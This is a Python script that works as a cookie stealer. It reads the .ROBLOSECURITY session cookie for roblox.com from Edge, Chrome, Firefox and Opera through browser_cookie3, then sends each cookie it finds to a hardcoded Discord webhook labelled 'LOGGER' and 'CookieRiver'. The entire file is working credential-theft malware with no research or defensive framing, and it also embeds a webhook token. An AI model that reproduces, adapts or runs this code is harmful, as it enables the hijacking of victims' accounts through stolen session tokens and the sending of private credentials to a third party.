import browser_cookie3
import requests
import threading
from discord_webhook import DiscordWebhook, DiscordEmbed

# Your Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1249336458301538465/N1YsItb6OHzOXUQnmwn4PjkySL3c8IeH5s_XZ-KX_1gV2KI0K21WYS_luSqjfPqhsCOb"

# Initialize the webhook
webhook = DiscordWebhook(url=webhook_url, username="CookieRiver")

def send_cookie_to_webhook(cookie):
    try:
        # Send the cookie to the webhook
        requests.post(webhook_url, json={'username': 'LOGGER', 'content': f'```Cookie: {cookie}```'})
        
        # Create an embed with the cookie information
        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
        
        # Add the embed to the webhook
        webhook.add_embed(embed)
        
        # Execute the webhook to send the message
        response = webhook.execute()
    except Exception as e:
        print(f"An error occurred: {e}")

def edge_logger():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        send_cookie_to_webhook(cookie)
    except Exception as e:
        print(f"An error occurred in edge_logger: {e}")

def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        send_cookie_to_webhook(cookie)
    except Exception as e:
        print(f"An error occurred in chrome_logger: {e}")

def firefox_logger():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        send_cookie_to_webhook(cookie)
    except Exception as e:
        print(f"An error occurred in firefox_logger: {e}")

def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        send_cookie_to_webhook(cookie)
    except Exception as e:
        print(f"An error occurred in opera_logger: {e}")

browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]
for logger in browsers:
    threading.Thread(target=logger).start()